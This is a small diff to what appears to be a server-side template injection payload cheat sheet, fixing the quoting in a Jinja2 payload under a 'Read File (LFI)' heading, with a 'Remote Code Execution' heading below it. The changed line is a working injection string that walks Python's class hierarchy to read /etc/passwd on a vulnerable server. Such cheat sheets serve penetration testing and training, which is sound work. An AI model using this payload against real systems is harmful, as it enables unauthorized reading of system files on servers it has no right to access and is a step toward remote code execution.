@@ -12,7 +12,7 @@ ${7*7} != {{7*7}} = {{7*'7'}} = Jinja2/Twig
 
 #### Read File (LFI)
 ```
-{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/etc/passwd).read()}} 
+{{ ''.__class__.__mro__[2].__subclasses__()[40]()('/etc/passwd').read()}} 
 ```
 
 #### Remote Code Execution (RCE)
